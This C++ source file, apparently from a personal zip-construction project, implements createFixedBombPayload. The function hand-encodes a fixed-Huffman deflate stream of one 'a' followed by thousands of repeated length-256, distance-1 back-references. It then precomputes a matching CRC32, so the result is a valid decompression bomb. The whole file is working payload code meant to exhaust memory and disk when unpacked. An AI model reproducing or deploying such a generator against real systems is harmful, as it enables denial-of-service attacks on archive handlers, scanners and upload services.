//
// Created by LeeEeZian on 30/9/2026.
//
#include "factory/PayloadFactory.h"
#include "deflation/lz77.h"
#include "deflation/BitWriter.h"
#include "zip_file_construction/LocalFileHeader.h"
#include <chrono>
#include <iostream>

DeflateResult payloadFactory::createFixedBombPayload(const size_t size) {
    const auto start{std::chrono::steady_clock::now()};
    using namespace lz77;
    BitWriter writer;
    writer.add(HuffmanTable::BFINAL::YES, 1);
    writer.add(HuffmanTable::BTYPE::FIXED_HUFFMAN, 2);

    auto [code, length]{HuffmanTable::fixedSymbolTable('a')};
    writer.add(code, length);

    constexpr int bytesToCopy{256};
    
    const MatchCode lengthCode{lz77::getLengthCode(bytesToCopy)};
    const MatchCode distanceCode{lz77::getDistanceCode(1)};

    for (size_t i{}; i < 4 * size; ++i) {
        auto [lCode, lLength]{HuffmanTable::fixedSymbolTable(lengthCode.symbol)};
        writer.add(lCode, lLength);
        writer.add(lengthCode.extraValue, lengthCode.extraBit);

        auto [dCode, dLength]{HuffmanTable::fixedDistanceTable(distanceCode.symbol)};
        writer.add(dCode, dLength);
        writer.add(distanceCode.extraValue, distanceCode.extraBit);
    }

    auto [endCode, endLength]{HuffmanTable::fixedSymbolTable(256)};
    writer.add(endCode, endLength);
    const size_t repeatedData{4 * size * bytesToCopy};

    const size_t uncompressedSize{repeatedData + 1};

    Crc32 BombCrc32{};

    Crc32 block{};
    block.update('a');
    block.computeCrc32();

    size_t remaining{uncompressedSize};
    while (remaining) {
        if (remaining & 1) {
            BombCrc32.combine(block);
        }

        block.combine(block);
        remaining >>= 1;
    }
    
    const auto end{std::chrono::steady_clock::now()};
    const auto elapsed{std::chrono::duration_cast<std::chrono::milliseconds>(end - start)};

    std::cout << "Total time of for bomb crc calculation " << elapsed << '\n';
    return {.data = writer.release(), .uncompressedSize = uncompressedSize, .crc32 = BombCrc32.getCrc32()};
}
